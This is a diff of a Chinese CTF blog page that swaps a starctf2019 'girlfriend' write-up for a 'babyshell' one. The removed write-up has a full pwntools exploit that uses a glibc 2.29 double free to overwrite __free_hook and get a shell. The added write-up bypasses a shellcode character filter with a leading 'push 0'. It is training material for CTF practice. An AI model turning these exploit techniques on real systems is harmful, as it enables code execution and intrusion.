@@ -108,24 +108,24 @@
 
 
 
-  <meta name="description" content="介绍starctf2019的一道题，题目不难，但是是最新的2.29的libc，调试起来挺麻烦的。">
+  <meta name="description" content="介绍starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="starctf2019-girlfriend">
-<meta property="og:url" content="https://mf-x.github.io/2019/05/05/starctf2019-girlfriend/index.html">
+<meta property="og:title" content="starctf2019-babyshell">
+<meta property="og:url" content="https://mf-x.github.io/2019/05/05/starctf2019-babyshell/index.html">
 <meta property="og:site_name" content="ivan">
-<meta property="og:description" content="介绍starctf2019的一道题，题目不难，但是是最新的2.29的libc，调试起来挺麻烦的。">
+<meta property="og:description" content="介绍starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-05T02:39:30.892Z">
+<meta property="og:updated_time" content="2019-05-05T04:42:07.822Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="starctf2019-girlfriend">
-<meta name="twitter:description" content="介绍starctf2019的一道题，题目不难，但是是最新的2.29的libc，调试起来挺麻烦的。">
+<meta name="twitter:title" content="starctf2019-babyshell">
+<meta name="twitter:description" content="介绍starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。">
 
 
 
 
 
 
-  <link rel="canonical" href="https://mf-x.github.io/2019/05/05/starctf2019-girlfriend/">
+  <link rel="canonical" href="https://mf-x.github.io/2019/05/05/starctf2019-babyshell/">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>starctf2019-girlfriend | ivan</title>
+  <title>starctf2019-babyshell | ivan</title>
   
 
 
@@ -329,7 +329,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/05/starctf2019-girlfriend/">
+    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/05/starctf2019-babyshell/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ivan Mo">
@@ -346,7 +346,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">starctf2019-girlfriend
+          <h1 class="post-title" itemprop="name headline">starctf2019-babyshell
               
             
           </h1>
@@ -371,7 +371,7 @@
                 
               
 
-              <time title="Created: 2019-05-05 10:24:57 / Modified: 10:39:30" itemprop="dateCreated datePublished" datetime="2019-05-05T10:24:57+08:00">2019-05-05</time>
+              <time title="Created: 2019-05-05 12:34:17 / Modified: 12:42:07" itemprop="dateCreated datePublished" datetime="2019-05-05T12:34:17+08:00">2019-05-05</time>
             
 
             
@@ -409,21 +409,13 @@
       
 
       
-        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>starctf2019的一道题，题目不难，但是是最新的2.29的libc，调试起来挺麻烦的。</p>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。</p>
 <a id="more"></a>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序是一个典型的单选系统，有add、show、call（free）等操作，结构体如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 node            struc ; (sizeof=0x18, mappedto_6)</span><br><span class="line">00000000 name_addr       dq ?                    ; offset</span><br><span class="line">00000008 size            dd ?</span><br><span class="line">0000000C call            db 12 dup(?)</span><br><span class="line">00000018 node            ends</span><br></pre></td></tr></table></figure>
-<p>漏洞出现在call的时候，free掉指针后，并没有将指针清零，并且没有对index做检查，所以可以做到double free</p>
-<p>并且leak信息也很简单，程序可以打印堆内容，打印chunk中残留的libc地址即可。</p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ol>
-<li>malloc一个大于tcache的堆，并free掉，直接输出堆内容，即可拿到残留的libc地址</li>
-<li>malloc两次，用于之后的double free</li>
-<li>malloc7个chunk并free掉，填满tcache</li>
-<li>再次free即可造成fastbin上double free，绕过检查即可</li>
-<li>malloc7次用完tcache，再利用double free修改<code>__free_hook</code></li>
-<li>free(“/bin/sh”)即可getshell</li>
-</ol>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./chall'</span></span><br><span class="line">lib64 = <span class="string">'./lib/libc.so.6'</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">8080</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(lib64)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, call)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the size of girl\'s name'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'please inpute her name:\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'please input her call:\n'</span>)</span><br><span class="line">    p.send(call)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the index:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the index:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">'\n'</span>,<span class="string">'11111'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>,<span class="string">'11111'</span>) <span class="comment"># 1</span></span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">leak = p.recv(<span class="number">6</span>)</span><br><span class="line">libc.address = u64(leak.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x7f1ea4c36ca0</span> - <span class="number">0x7f1ea4885000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备之后fastbin上的double free</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x60</span>,str(i)*<span class="number">10</span>,str(<span class="number">1</span>)*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填满tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    call(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin上double free</span></span><br><span class="line">call(<span class="number">2</span>)</span><br><span class="line">call(<span class="number">3</span>)</span><br><span class="line">call(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc完tcache上的chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x60</span>,str(i)*<span class="number">10</span>,str(<span class="number">1</span>)*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __free_hook -&gt; system</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x13</span>),<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span> + p64(libc.symbols[<span class="string">'system'</span>]),<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span> + p64(libc.symbols[<span class="string">'system'</span>]),<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span> + p64(libc.symbols[<span class="string">'system'</span>]),<span class="string">'111'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system("/bin/sh")</span></span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序很简单，读入shellcode，做检查，check过了就执行shellcode。</p>
+<p>这个检查规定了你的shellcode必须为指定的字符，但是检查到’\x00’就停止检查，所以很容易被绕过。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *j; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = table; *j &amp;&amp; *j != *i; ++j )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*j )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>我们需要产生一个’\x00’来绕过检查，很容易想到的就是push 0，或者pop 0。而push 0正好是’j\x00’，而’j’在允许的table表中，所以在shellcode前面加上push 0即可。</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./shellcode'</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">'push 0'</span>) + asm(shellcraft.amd64.sh(),arch=<span class="string">'amd64'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -451,8 +443,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/04/starctf2019-quicksort/" rel="next" title="starctf2019-quicksort">
-                <i class="fa fa-chevron-left"></i> starctf2019-quicksort
+              <a href="/2019/05/05/starctf2019-girlfriend/" rel="next" title="starctf2019-girlfriend">
+                <i class="fa fa-chevron-left"></i> starctf2019-girlfriend
               </a>
             
           </div>
@@ -460,10 +452,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/05/starctf2019-babyshell/" rel="prev" title="starctf2019-babyshell">
-                starctf2019-babyshell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
